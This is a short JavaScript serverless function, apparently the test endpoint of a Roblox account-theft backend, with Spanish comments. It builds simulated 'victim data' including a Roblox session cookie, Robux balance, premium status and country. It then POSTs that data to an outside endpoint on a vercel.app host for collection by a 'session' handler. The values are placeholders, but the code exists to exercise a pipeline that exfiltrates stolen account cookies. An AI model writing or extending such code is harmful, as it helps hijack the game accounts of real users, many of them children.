// api/test-session.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    const testId = "test_" + Date.now();
    
    // Simular datos de víctima
    const testData = {
        roblox: {
            username: "Usuario_Test",
            userId: testId,
            robux: 9999,
            seguidores: 5000,
            amigos: 1000,
            premium: "Sí",
            verified: "Sí",
            headless: "Sí",
            korblox: "No"
        },
        cookie: "COOKIE_TEST_123456",
        pais: "Argentina",
        fecha: new Date().toLocaleDateString(),
        hora: new Date().toLocaleTimeString()
    };
    
    // Enviar a session.js
    const sessionRes = await fetch(`https://generador-imagen.vercel.app/api/session`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: testId, victimData: testData })
    });
    
    const sessionData = await sessionRes.json();
    
    res.status(200).json({
        testId,
        sessionResponse: sessionData,
        mensaje: "✅ Prueba enviada a session.js"
    });
}